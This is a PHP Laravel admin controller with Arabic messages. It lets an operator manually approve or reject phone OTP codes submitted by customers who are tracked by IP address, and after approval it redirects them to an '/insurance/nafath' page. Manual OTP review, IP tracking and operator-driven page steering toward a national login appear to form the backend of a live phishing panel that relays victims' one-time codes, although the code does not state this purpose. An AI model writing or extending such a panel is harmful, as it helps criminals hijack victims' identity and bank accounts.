<?php

namespace App\Http\Controllers\Admin;

use App\Events\PhoneOtpApproved;
use App\Events\PhoneOtpRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\AdminOtpActionRequest;
use App\Http\Requests\Admin\AdminOtpRejectRequest;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;

class AdminPhoneVerificationController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve phone verification OTP
     */
    public function approve(AdminOtpActionRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        try {
            broadcast(new PhoneOtpApproved($request->customer_ip))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approvePhone): ' . $e->getMessage());
        }

        CustomerProfile::where('ip_address', $request->customer_ip)
            ->update(['current_page' => '/insurance/nafath']);

        $this->notifyDashboard($request->customer_ip, 'phone_approved');

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على التحقق الهاتفي - تم توجيه العميل إلى صفحة النفاذ',
        ]);
    }

    /**
     * Reject phone verification OTP
     */
    public function reject(AdminOtpRejectRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        try {
            broadcast(new PhoneOtpRejected($request->customer_ip, $request->input('reason')))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectPhone): ' . $e->getMessage());
        }

        $this->notifyDashboard($request->customer_ip, 'phone_rejected');

        return response()->json([
            'success' => true,
            'message' => 'تم رفض التحقق الهاتفي',
        ]);
    }
}
